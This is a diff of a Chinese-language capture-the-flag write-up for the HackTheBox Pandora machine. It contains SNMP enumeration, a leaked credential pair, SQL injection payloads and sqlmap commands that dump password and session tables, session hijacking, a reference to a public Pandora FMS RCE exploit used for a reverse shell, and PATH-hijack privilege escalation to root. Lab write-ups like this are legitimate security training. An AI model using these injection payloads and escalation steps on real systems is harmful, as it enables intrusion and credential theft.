@@ -1,8 +1,17 @@
-## namp
+---
+title: HackTheBox-Pandora
+date: 2025-4-4 20:00:00
+tags: 红队
+categories: 红队打靶-Linux
+---
+
+
+
+# namp
 
 ![image-20250403145819666](Pandora/image-20250403145819666.png)
 
-## 161端口
+# 161端口
 
 ```
 snmpwalk -v 2c -c public 9.0.0.1 所有系统信息都获取
@@ -22,7 +31,7 @@ daniel:HotelBabylon23
 
 ![image-20250403160238522](Pandora/image-20250403160238522.png)
 
-## 80端口
+# 80端口
 
 ![image-20250403152736544](Pandora/image-20250403152736544.png)
 
@@ -59,6 +68,8 @@ ssh daniel@10.10.11.136 -L 9002:localhost:80
 ![image-20250403173329627](Pandora/image-20250403173329627.png)
 
 可以手注也可以使用sqlmap
+
+## sql注入
 
 ### 手注
 
@@ -97,8 +108,6 @@ http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1' 
 tvisual_console_elements_cac
 ```
 
-
-
 ```http
 ##默认只能返回 32 个字符，使用 substring 解决这个问题，返回第 25 个字符再往后显示 30 个字符
 http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1' UNION SELECT 1,extractvalue(1,concat(0x7e,(select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database()))),3 --+
@@ -112,7 +121,7 @@ _cache,tservice_element,tuser_
 拼接第一次注入的内容
 tvisual_console_elements_cache,tservice_element,tuser_
 
-反复往后读最终的内容为
+反复往后读即可
 ```
 
 ### sqlmap
@@ -313,3 +322,76 @@ sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?ses
 |————————————————————————————————————|
 ```
 
+#### 列名
+
+```shell
+sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tpassword_history --columns  --threads 10
+
+```
+
+![image-20250403204812339](Pandora/image-20250403204812339.png)
+
+拿到密码之后破解不了，还有个session表，尝试替换session登录
+
+```shell
+sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tsessions_php --columns --dump  --threads 10
+```
+
+![image-20250405163143411](Pandora/image-20250405163143411.png)
+
+#### 数据
+
+```shell
+sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tpassword_history -C "id_pass,id_user,password" --dump  --threads 10
+
+```
+
+![image-20250403204832190](Pandora/image-20250403204832190.png)
+
+```shell
+sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tsessions_php -C "data,id_session" --threads 10  --dump --where "data<>''"
+```
+
+![image-20250405163222865](Pandora/image-20250405163222865.png)
+
+登录时将session替换为matt的session即可登录到matt用户的后台
+
+![image-20250405164316757](Pandora/image-20250405164316757.png)
+
+## 远程代码执行
+
+[CVE-2020-13851 Pandora FMS 7.44](https://github.com/hadrian3689/pandorafms_7.44)
+
+![image-20250405184421005](Pandora/image-20250405184421005.png)
+
+使用该exp可以直接反弹matt的shell
+
+![image-20250405184427649](Pandora/image-20250405184427649.png)
+
+# 提权
+
+查看运用suid权限的文件，有个pandora的备份程序
+
+![image-20250405190823550](Pandora/image-20250405190823550.png)
+
+以FMC反弹过来的matt用户的shell没有权限运行sudo和suid权限的文件，是因为apache配置文件中给matt用户定义在了matt组中
+
+![image-20250405190530266](Pandora/image-20250405190530266.png)
+
+写入自己公钥使用私钥去连接
+
+![image-20250405190231789](Pandora/image-20250405190231789.png)
+
+![image-20250405190438894](Pandora/image-20250405190438894.png)
+
+运行pandora_backup，使用tar来对文件内容进行压缩
+
+![image-20250405190632452](Pandora/image-20250405190632452.png)
+
+并且suid权限的文件中没有`tar`那就说明tar是从环境变量中去读取，那么写一个恶意的`tar`让`pandora_backup`来运行达到提权的目的
+
+![image-20250405191517100](Pandora/image-20250405191517100.png)
+
+然后运行pandora_backup监听4444端口即可得到root的shell
+
+![image-20250405191711107](Pandora/image-20250405191711107.png)
